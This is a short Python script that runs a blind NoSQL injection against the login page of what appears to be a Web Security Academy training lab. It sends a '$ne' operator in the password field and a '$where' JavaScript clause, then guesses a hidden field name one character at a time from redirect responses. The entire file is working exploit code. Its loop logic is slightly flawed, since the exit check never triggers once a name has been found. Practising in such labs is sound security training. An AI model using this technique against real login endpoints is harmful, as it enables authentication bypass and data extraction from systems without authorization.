import requests
from urllib import parse
from string import ascii_lowercase, ascii_uppercase, digits

url = "https://0ac8003203551d4e8071a301002e00a0.web-security-academy.net/login"

data_json = {
    "username": "wiener",
    "password": {"$ne":"hello"},
    "$where": "Object.keys(this)[3].match('^.{0}.*')"
}

row_name = "password"

while True:
    for c in "-_" + ascii_lowercase + ascii_uppercase + digits:
        row = row_name + c
        payload = "Object.keys(this)[3].match('^.{0}" + row + ".*')"
        data_json["$where"] = payload
        res = requests.post(url, json=data_json, allow_redirects=False)

        if res.status_code == 302:
            row_name += c
            print(row_name)
            break
    
    if row_name == "":
        break

